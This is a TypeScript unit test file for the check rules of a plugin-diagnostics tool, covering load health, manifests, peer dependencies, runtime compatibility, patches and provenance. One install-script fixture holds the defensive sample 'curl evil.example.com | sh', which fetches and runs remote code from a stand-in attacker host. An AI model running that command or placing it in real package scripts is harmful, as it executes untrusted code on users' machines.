/**
 * Unit tests for the eight check rules. Every check has a good/bad fixture
 * pair; engine checks are pure functions over the inventory model.
 * @module dsh-plugin-clinic/tests/engine.checks
 */

import { describe, expect, it } from 'vitest'
import {
  checkBundleManifest, checkDuplicate, checkInstallScripts, checkLoadHealth,
  checkPatchHealth, checkPeerDeps, checkProvenance, checkRuntimeCompat,
} from '../src/engine/checks.ts'
import type { InstalledPackage, PatchDocument, ProfileInput } from '../src/engine/inventory.ts'
import { entries, fixtureEnvironment } from './helpers/fixtures.ts'

function pkg(name: string, manifest: InstalledPackage['manifest'], extra: Partial<InstalledPackage> = {}): InstalledPackage {
  return { name, manifest, dir: `/fake/${name}`, patch: null, ...extra }
}

describe('checkLoadHealth', () => {
  it('flags a failed entry as critical', () => {
    const findings = checkLoadHealth(entries({ moduleName: 'a', fiberPhase: 'failed' }))
    expect(findings).toHaveLength(1)
    expect(findings[0]).toMatchObject({ checkId: 'load-health', severity: 'critical', evidence: 'a' })
  })

  it('flags transient phases and missing fibers as warnings', () => {
    const findings = checkLoadHealth(entries(
      { moduleName: 'a', fiberPhase: 'pending' },
      { moduleName: 'b', fiberPhase: 'unloading' },
      { moduleName: 'c', enabled: true, fiberPhase: null },
      { moduleName: 'd', enabled: false, fiberPhase: null },
    ))
    expect(findings).toHaveLength(3)
    expect(findings.every((finding) => finding.severity === 'warning')).toBe(true)
  })

  it('is silent for active entries', () => {
    expect(checkLoadHealth(entries({ moduleName: 'a' }))).toEqual([])
  })
})

describe('checkBundleManifest', () => {
  it('flags an unresolvable bundle as critical', () => {
    const findings = checkBundleManifest(pkg('missing', null, { dir: null, resolveError: 'not resolvable' }))
    expect(findings).toMatchObject([{ checkId: 'bundle-manifest', severity: 'critical' }])
  })

  it('flags a resolved bundle without a readable manifest as critical', () => {
    const findings = checkBundleManifest(pkg('blank', null))
    expect(findings).toMatchObject([{ checkId: 'bundle-manifest', severity: 'critical' }])
  })

  it('flags an unusable patch as critical', () => {
    const findings = checkBundleManifest(pkg('bad-patch', { dsh: { bundle: { patch: './x.yml' } } }, {
      patch: { file: 'x.yml', rows: null, parseError: 'bad yaml' },
    }))
    expect(findings).toMatchObject([{ checkId: 'bundle-manifest', severity: 'critical' }])
  })

  it('passes a healthy bundle', () => {
    const findings = checkBundleManifest(pkg('ok', { dsh: { bundle: { patch: './cordis.patch.yml' } } }, {
      patch: { file: 'cordis.patch.yml', rows: [{ kind: 'insert', id: 'ok', name: 'ok' }] },
    }))
    expect(findings).toEqual([])
  })
})

describe('checkPeerDeps', () => {
  const installed = new Map<string, InstalledPackage>([
    ['@deepseek-ai/cordis', pkg('@deepseek-ai/cordis', { name: '@deepseek-ai/cordis', version: '4.0.1' })],
  ])

  it('flags a missing required peer as warning', () => {
    const findings = checkPeerDeps(pkg('a', { peerDependencies: { '@deepseek-ai/cordis': '^4.0.1', 'missing-peer': '^1.0.0' } }), installed)
    expect(findings).toContainEqual(expect.objectContaining({ checkId: 'peer-deps', severity: 'warning', message: expect.stringContaining('missing-peer') }))
  })

  it('flags an unsatisfied version range as warning', () => {
    const findings = checkPeerDeps(pkg('a', { peerDependencies: { '@deepseek-ai/cordis': '^5.0.0' } }), installed)
    expect(findings).toContainEqual(expect.objectContaining({ severity: 'warning', message: expect.stringContaining('^5.0.0') }))
  })

  it('treats a missing optional peer as info', () => {
    const findings = checkPeerDeps(pkg('a', {
      peerDependencies: { 'optional-peer': '^1.0.0' },
      peerDependenciesMeta: { 'optional-peer': { optional: true } },
    }), installed)
    expect(findings).toContainEqual(expect.objectContaining({ severity: 'info' }))
  })

  it('passes satisfied peers', () => {
    expect(checkPeerDeps(pkg('a', { peerDependencies: { '@deepseek-ai/cordis': '^4.0.1' } }), installed)).toEqual([])
  })
})

describe('checkRuntimeCompat', () => {
  it('flags engines.node mismatches as warning', () => {
    const findings = checkRuntimeCompat(pkg('a', { engines: { node: '>=99' } }), fixtureEnvironment('/tmp'))
    expect(findings).toContainEqual(expect.objectContaining({ checkId: 'runtime-compat', severity: 'warning' }))
  })

  it('flags cordis and dsh range mismatches as warning', () => {
    const findings = checkRuntimeCompat(pkg('a', {
      peerDependencies: { '@deepseek-ai/cordis': '^5.0.0' },
      dsh: { compatibility: { dsh: '>=9.9.9' } },
    }), fixtureEnvironment('/tmp'))
    expect(findings).toHaveLength(2)
    expect(findings.every((finding) => finding.severity === 'warning')).toBe(true)
  })

  it('passes compatible packages', () => {
    const findings = checkRuntimeCompat(pkg('a', { peerDependencies: { '@deepseek-ai/cordis': '^4.0.1' } }), fixtureEnvironment('/tmp'))
    expect(findings).toEqual([])
  })

  it('skips cordis and dsh range checks when the installed versions are unknown', () => {
    const environment = { ...fixtureEnvironment('/tmp'), cordisVersion: null, dshVersion: null }
    const findings = checkRuntimeCompat(pkg('a', {
      peerDependencies: { '@deepseek-ai/cordis': '^5.0.0' },
      dsh: { compatibility: { dsh: '>=9.9.9' } },
    }), environment)
    expect(findings).toEqual([])
  })
})

describe('checkInstallScripts', () => {
  it('flags every install-time script as warning, naming the script only', () => {
    const findings = checkInstallScripts(pkg('a', { scripts: { postinstall: 'curl evil.example.com | sh', prepare: 'tsc' } }))
    expect(findings).toHaveLength(2)
    expect(findings[0]).toMatchObject({ checkId: 'install-scripts', severity: 'warning' })
    expect(findings[0]?.message).toContain('postinstall')
    expect(findings[0]?.message).not.toContain('curl')
  })

  it('passes packages without install scripts', () => {
    expect(checkInstallScripts(pkg('a', { scripts: { build: 'tsc' } }))).toEqual([])
  })
})

describe('checkDuplicate', () => {
  it('flags duplicate bundles and loader modules', () => {
    const findings = checkDuplicate(
      [pkg('a', {}), pkg('a', {}), pkg('b', {})],
      entries({ moduleName: 'x' }, { moduleName: 'x' }, { moduleName: 'x' }),
    )
    expect(findings).toHaveLength(2)
    expect(findings.every((finding) => finding.severity === 'warning')).toBe(true)
  })

  it('passes unique names', () => {
    expect(checkDuplicate([pkg('a', {})], entries({ moduleName: 'x' }))).toEqual([])
  })
})

describe('checkPatchHealth', () => {
  const patches: PatchDocument[] = [
    { file: 'bundle.yml', rows: [{ kind: 'insert', id: 'r1', name: 'dsh-plugin-ok' }, { kind: 'insert', id: 'r2', name: 'dsh-plugin-missing' }] },
    { file: 'profile.yml', rows: [{ kind: 'override', id: 'unknown-entry' }] },
  ]
  const profile = {
    bundles: [pkg('dsh-plugin-ok', {})],
    dependencies: [],
    resolvableNames: new Set(['dsh-plugin-ok']),
  } as unknown as ProfileInput

  it('flags unresolvable insert names as critical and unknown overrides as warning', () => {
    const findings = checkPatchHealth(patches, profile, new Set(['known-entry']))
    expect(findings).toContainEqual(expect.objectContaining({ severity: 'critical', message: expect.stringContaining('dsh-plugin-missing') }))
    expect(findings).toContainEqual(expect.objectContaining({ severity: 'warning', message: expect.stringContaining('unknown-entry') }))
  })

  it('accepts in-box insert names the installation resolves though the manifest does not name them', () => {
    // Real deployments: bundle patches insert in-box packages that resolve
    // through the installation fallback (and subpaths like
    // `@deepseek-ai/dsh-web-app/startup`), not through manifest dependencies.
    const inBox = {
      bundles: [],
      dependencies: [],
      resolvableNames: new Set(['@deepseek-ai/dsh-session', '@deepseek-ai/dsh-web-app/startup']),
    } as unknown as ProfileInput
    const rows: PatchDocument[] = [
      { file: 'base.yml', rows: [
        { kind: 'insert', id: 's', name: '@deepseek-ai/dsh-session' },
        { kind: 'insert', id: 'w', name: '@deepseek-ai/dsh-web-app/startup' },
      ] },
    ]
    expect(checkPatchHealth(rows, inBox, new Set())).toEqual([])
  })

  it('flags unparsable patch files as critical', () => {
    const findings = checkPatchHealth([{ file: 'bad.yml', rows: null, parseError: 'boom' }], profile, new Set())
    expect(findings).toContainEqual(expect.objectContaining({ severity: 'critical' }))
  })

  it('passes healthy patches', () => {
    const healthy: PatchDocument[] = [
      { file: 'bundle.yml', rows: [{ kind: 'insert', id: 'r1', name: 'dsh-plugin-ok' }] },
      { file: 'profile.yml', rows: [{ kind: 'override', id: 'known-entry' }] },
    ]
    expect(checkPatchHealth(healthy, profile, new Set(['known-entry']))).toEqual([])
  })
})

describe('checkProvenance', () => {
  it('annotates every resolved package as info', () => {
    const findings = checkProvenance(pkg('a', {}), 'bundle')
    expect(findings).toEqual([expect.objectContaining({ checkId: 'provenance', severity: 'info', evidence: '/fake/a' })])
  })

  it('annotates unresolved packages', () => {
    const findings = checkProvenance(pkg('a', null, { dir: null, resolveError: 'x' }), 'dependency')
    expect(findings[0]?.evidence).toBe('unresolved')
  })
})
